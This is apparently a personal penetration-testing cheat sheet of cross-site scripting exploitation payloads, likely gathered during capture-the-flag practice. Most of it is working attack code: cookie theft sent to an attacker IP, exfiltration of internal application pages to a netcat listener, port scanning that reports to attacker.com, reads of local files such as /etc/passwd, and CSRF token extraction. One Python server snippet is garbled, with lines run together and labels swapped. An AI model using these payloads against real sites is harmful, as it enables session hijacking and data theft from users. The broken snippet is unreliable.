# Exploitation


### Cookie Stealing

##### Basic/Classic

```
<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
```

##### Bypassing secure flag protection

We can also use [Certbot](Certbot.md)

Creating a HTTP server

```
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```

Generating certificate

```
#!/usr/bin/python3
import http.server, sslserver_address = ('0.0.0.0', 443)
httpd = http.server.HTTPServer(server_address,
http.server.SimpleHTTPRequestHandler)
httpd.socket =
ssl.wrap_socket(httpd.socket,server_side=True,certfile='local
host.pem')
"""ssl_version=ssl.PROTOCOL_TLSv1_2)
"""
httpd.serve_forever()
```

##### Via XHR

```
var xhr=new XMLHttpRequest();
xhr.open("GET", "https://10.10.14.8/?"+document.cookie,
true);
xhr.send();
```

### Open Redirect

```
<script>window.location.replace("http://evil.com");</script>
```


### Accessing Internal application 

```
var url="http://mail.stacked.htb/" //targeturl(internal wep
application)
var xhr=new XMLHttpRequest();
xhr.open("GET", url, false);
xhr.send();
var resp=xhr.responseText;//transferring HTTP response to us
var xhr2=new XMLHttpRequest();
xhr2.open("POST", 'http://10.10.14.89:443/', false);
xhr2.send(resp);
```

```
<script src="http://10.10.14.89/apni.js"></script>
```

we need to lister like `nc -lvnp 443 > filename.html` then we can see the internal application html.

### Port Scan

```
<script>
const checkPort = (port) => {
fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
let img = document.createElement("img");
img.src = `http://attacker.com/ping?port=${port}`;
});
}
for(let i=0; i<1000; i++) {
checkPort(i);
}
</script>
```

```
<img src="https://attacker.com/startingScan">
```

#### Read local File

```
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```
<script>
xhzeem = new XMLHttpRequest();
xhzeem.onload = function(){document.write(this.responseText);}
xhzeem.onerror = function(){document.write('failed!')}
xhzeem.open("GET","file:///etc/passwd");
xhzeem.send();
</script>
```

```
<iframe src=file:///etc/passwd></iframe>

<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>

<link rel=attachment href="file:///root/secret.txt">

<object data="file:///etc/passwd">

<portal src="file:///etc/passwd" id=portal>

<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File:/etc/passwd" pos-x="195" />
```

Send a request to get a csrf-value 

```
var url = "/[user/new](https://hackme5.coupadev.com/user/new)";var xhr = new XMLHttpRequest();  
    xhr.responseType = "document";  
    xhr.open("GET", url, true);  
    xhr.onload = function (e) {  
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {  
            page = xhr.response  
            // Get the csrf token from meta tag  
            token = page.getElementsByName('csrf-token')[0].getAttribute('content')  
            // Show the token  
            console.log("The token is: " + token);  
        }  
    };  
    xhr.send(null);
```

